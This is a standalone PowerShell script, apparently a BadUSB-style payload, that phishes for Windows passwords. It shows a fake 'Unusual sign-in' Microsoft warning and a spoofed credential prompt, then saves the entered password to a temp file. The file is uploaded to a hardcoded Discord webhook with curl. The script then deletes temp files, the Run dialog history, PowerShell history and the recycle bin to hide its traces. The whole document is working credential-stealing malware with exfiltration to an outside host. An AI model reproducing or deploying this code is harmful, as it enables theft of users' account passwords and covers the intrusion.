$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm).txt"

function Get-Creds {
do{
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName);
   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
    $creds = $null
    #Get-Creds
} else { $creds = $cred.getnetworkcredential().password; $done = $true }
} until ($done)
return $creds
}

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}

Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")

$creds = Get-Creds
$creds = "Password: " + ($creds[$creds.Length - 1]);
echo $creds >> $env:TMP\$FileName

$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
$SourceFilePath="$env:TMP\$FileName"
curl.exe -F "file1=@$SourceFilePath" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
